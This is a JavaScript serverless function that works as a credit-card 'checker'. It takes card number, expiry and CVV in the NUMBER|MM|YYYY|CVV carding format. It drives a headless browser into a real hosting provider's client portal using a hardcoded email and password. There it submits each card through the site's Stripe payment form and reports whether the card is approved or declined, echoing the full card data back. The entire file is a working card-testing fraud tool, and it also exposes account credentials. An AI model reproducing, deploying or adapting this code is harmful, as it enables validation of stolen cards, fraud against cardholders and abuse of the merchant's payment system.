// Serverless-compatible version for Vercel/Netlify
import puppeteer from 'puppeteer-core';
import chromium from '@sparticuz/chromium';

// Serverless Chromium configuration
const isDev = process.env.NODE_ENV === 'development';

async function getBrowserInstance() {
    if (isDev) {
        // Local development
        return puppeteer.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
    } else {
        // Production serverless
        return puppeteer.launch({
            args: chromium.args,
            defaultViewport: chromium.defaultViewport,
            executablePath: await chromium.executablePath(),
            headless: chromium.headless,
        });
    }
}

// Main function for serverless deployment
export default async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { ccString } = req.body;

    if (!ccString) {
        return res.status(400).json({ 
            error: 'Please provide credit card details in format: NUMBER|MM|YYYY|CVV' 
        });
    }

    const [ccNumber, ccExpMonth, ccExpYear, ccCvv] = ccString.split('|');

    if (!ccNumber || !ccExpMonth || !ccExpYear || !ccCvv) {
        return res.status(400).json({ 
            error: 'Invalid credit card format. Use: NUMBER|MM|YYYY|CVV' 
        });
    }

    let browser;
    try {
        console.log('🚀 Starting serverless card checker...');
        browser = await getBrowserInstance();
        const page = await browser.newPage();

        // Set headers
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        });

        // Navigate to login
        await page.goto('https://clients.asurahosting.com/login', { 
            waitUntil: 'networkidle2',
            timeout: 30000 
        });

        // Login process (simplified for serverless)
        await page.waitForSelector('#inputEmail', { timeout: 10000 });
        await page.type('#inputEmail', 'amt.itsmerjc@gmail.com');
        await page.type('#inputPassword', '.=UkBYqDgw$b');
        await page.click('button[type="submit"]');

        // Wait for login
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 });

        // Navigate to payment methods
        await page.goto('https://clients.asurahosting.com/account/paymentmethods/add', {
            waitUntil: 'networkidle2',
            timeout: 30000
        });

        // Fill card details (simplified)
        const cardFrame = await page.$('#stripeCreditCard iframe');
        const cardFrameContent = await cardFrame.contentFrame();
        await cardFrameContent.type('input[name="cardnumber"]', ccNumber);

        const expiryFrame = await page.$('#stripeExpiryDate iframe');
        const expiryFrameContent = await expiryFrame.contentFrame();
        await expiryFrameContent.type('input[name="exp-date"]', `${ccExpMonth}/${ccExpYear.slice(-2)}`);

        const cvcFrame = await page.$('#stripeCvc iframe');
        const cvcFrameContent = await cvcFrame.contentFrame();
        await cvcFrameContent.type('input[name="cvc"]', ccCvv);

        // Submit
        await page.click('#btnSubmit');
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });

        // Check result
        const pageContent = await page.content();
        const isDeclined = pageContent.toLowerCase().includes('declined');
        const isSuccess = pageContent.toLowerCase().includes('payment method added');

        let status = 'UNKNOWN';
        if (isDeclined) status = 'DECLINED';
        else if (isSuccess) status = 'APPROVED';

        return res.status(200).json({
            status,
            card: {
                number: ccNumber,
                expiry: `${ccExpMonth}/${ccExpYear}`,
                cvv: ccCvv
            },
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ 
            error: 'Card checking failed',
            details: error.message 
        });
    } finally {
        if (browser) {
            await browser.close();
        }
    }
}
